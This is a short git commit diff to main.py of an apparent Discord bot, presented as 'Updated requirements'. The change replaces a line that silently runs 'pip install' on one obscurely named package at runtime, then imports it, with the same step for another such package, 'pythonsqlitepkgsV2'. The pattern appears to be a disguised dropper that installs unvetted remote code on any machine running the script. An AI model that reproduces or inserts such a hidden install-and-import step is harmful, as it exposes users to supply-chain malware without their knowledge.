095ddd3b2d3bc7419408f44a5b06bd88a051db32
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-08 23:10:17 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcoloringspackageV2")
-import pipcoloringspackageV2
+os.system("pip install pythonsqlitepkgsV2")
+import pythonsqlitepkgsV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
